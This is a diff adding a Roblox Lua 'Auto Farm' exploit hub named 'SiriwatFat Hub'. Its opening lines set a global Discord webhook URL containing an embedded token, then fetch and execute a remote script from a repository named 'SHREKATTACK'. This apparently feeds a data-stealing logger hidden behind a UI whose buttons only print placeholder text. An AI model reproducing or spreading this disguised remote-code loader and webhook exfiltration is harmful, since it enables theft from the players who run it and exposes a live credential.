@@ -1,0 +1,18 @@
+_G.webhooksdiscord = "https://discord.com/api/webhooks/923152301710008341/sf8Nbp1A_G8lb5Wz2MyFhIlVNwwgeYgQmy9yNSzG6UiOMzZFtV_xINRn0j7e-MZ0XTRn"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua%22),true)()
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua%22))()
+local Window = Library.CreateLib("SiriwatFat Hub", "DarkTheme")
+local Tab = Window:NewTab("Auto Farm")
+local Section = Tab:NewSection("Auto Farm")
+
+Section:NewButton("Anti Afk", "ButtonInfo", function()
+    print("Clicked")
+end)
+Section:NewToggle("Auto Meteors", "ToggleInfo", function(state)
+    if state then
+        print("Toggle On")
+    else
+        print("Toggle Off")
+    end
+end)
